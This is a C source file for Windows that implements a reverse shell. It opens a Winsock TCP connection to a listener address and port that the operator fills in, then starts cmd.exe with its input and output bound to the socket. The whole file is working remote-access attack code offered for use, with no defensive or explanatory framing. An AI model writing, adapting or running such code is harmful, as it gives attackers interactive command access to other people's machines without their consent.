#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#define MAX 600
//compile with -lws2_32

int Start_Connection_and_Process(){
	
	WSADATA wsaData;
	SOCKET client_socket;
	struct sockaddr_in server_addr;
	char listener_addr[]; //PUT SERVER ADDRESS HERE
	int listener_port; //PUT SERVER PORT HERE
	char recv_buffer[MAX];
	
	//start winsock 2.2
	printf("[+] initializing winsock 2.2\n");
	if ( WSAStartup(MAKEWORD(2,2),&wsaData) != 0 ){
		printf("[x] winsock failed, err code: %d\n",WSAGetLastError());
		exit(1);
	};

	//create socket
	printf("[+] creating socket\n");
	client_socket=WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	if (client_socket == INVALID_SOCKET){
		printf("[x] socket creation failed, err code: %d\n",WSAGetLastError());
		WSACleanup();
		exit(1);
	
	}
	
	//assigning server values
	server_addr.sin_family=AF_INET;
	server_addr.sin_port=htons(listener_port);
	server_addr.sin_addr.s_addr=inet_addr(listener_addr);
	if ( server_addr.sin_addr.s_addr == INADDR_NONE ){
		printf("[x] invalid address\n[x]exiting\n");
		closesocket(client_socket);
		WSACleanup();
		exit(1);
		
	};

	//connect to server
	printf("[+] connecting to server\n");
	int connect = WSAConnect(client_socket,(SOCKADDR *)&server_addr,sizeof(server_addr),NULL,NULL,NULL,NULL);	
	if (connect != 0){
		printf("[x] can't connect to server\n");
		closesocket(client_socket);
		WSACleanup();
		exit(1);
	}
	
	//recieve data
	recv(client_socket,recv_buffer,sizeof(recv_buffer),0);	



	// CREATING PROCESS //
	//declare process struct and info 
	STARTUPINFOA proc;
	PROCESS_INFORMATION proc_info;
	memset(&proc,0,sizeof(proc));
	proc.cb=sizeof(proc);
	proc.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	proc.hStdInput=(HANDLE) client_socket;
	proc.hStdOutput=(HANDLE) client_socket;
	proc.hStdError=(HANDLE) client_socket; //pipe stderr stdin stdout to socket

	//create process
	CreateProcessA(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&proc,&proc_info); //spawm cmd	
	
	//wait for process to finish
	
	WaitForSingleObject(proc_info.hProcess,INFINITE);
	CloseHandle(proc_info.hProcess);
	CloseHandle(proc_info.hThread);
	

	// PROCESS END //
	
 
	//CLEANUP	
	memset(recv_buffer,0,sizeof(recv_buffer));
	closesocket(client_socket);
	WSACleanup();
	return 0;
}




int main(void){
	
	Start_Connection_and_Process();

	return 0;
}

